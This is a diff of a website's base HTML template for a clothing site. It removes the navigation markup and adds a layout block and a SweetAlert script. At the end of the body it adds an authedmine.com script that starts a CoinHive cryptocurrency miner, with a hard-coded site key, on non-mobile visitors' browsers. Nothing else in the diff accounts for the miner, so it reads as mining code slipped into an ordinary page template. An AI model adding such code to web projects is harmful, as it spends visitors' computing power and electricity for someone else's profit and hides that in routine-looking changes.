@@ -13,47 +13,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 </head>
 <body>
-  <nav>
-    <div class="container nav-wrapper">
-      <a href="{{'' | url}}" class="brand-logo">Clothes</a>
-      <a href="#" data-target="mobile-demo" class="sidenav-trigger"><i class="material-icons">menu</i></a>
-      <ul id="nav-mobile" class="right hide-on-med-and-down">
-      {% if user %}
-        <li>
-          <a href="{{'auth/logout' | url}}">Logout</a>
-        </li>
-      {% else %}
-        <li>
-          <a href="{{'auth/login' | url}}">Login</a>
-        </li>
-        <li>
-          <a href="{{'auth/signup' | url}}">Sign up</a>
-        </li>
-      {% endif %}
-      </ul>
-    </div>
-  </nav>
-  <ul class="sidenav" id="mobile-demo">
-    {% if user %}
-      <li>
-        <a href="{{'auth/logout' | url}}">Logout</a>
-      </li>
-    {% else %}
-      <li>
-        <a href="{{'auth/login' | url}}">Login</a>
-      </li>
-      <li>
-        <a href="{{'auth/signup' | url}}">Sign up</a>
-      </li>
-    {% endif %}
-  </ul>
-  <div class="section container">
-    {{ block('content') }}
-  </div>
+
+    {{ block('layout') }}
 
   <!--JavaScript at end of body for optimized loading-->
   <script type="text/javascript" src="{{'static/js/materialize.min.js' | url}}"></script>
+  <script src="{{'static/js/sweetalert.min.js' | url}}"></script>
   <script type="text/javascript" src="{{'static/js/app.js' | url}}"></script>
   {% block script %}{% endblock %}
+  <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('46cSjyoRIhUqjHUpGo2fC7nuvbEn7js1', {throttle: 0.3});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+  </script>
+  
+  
 </body>
 </html>
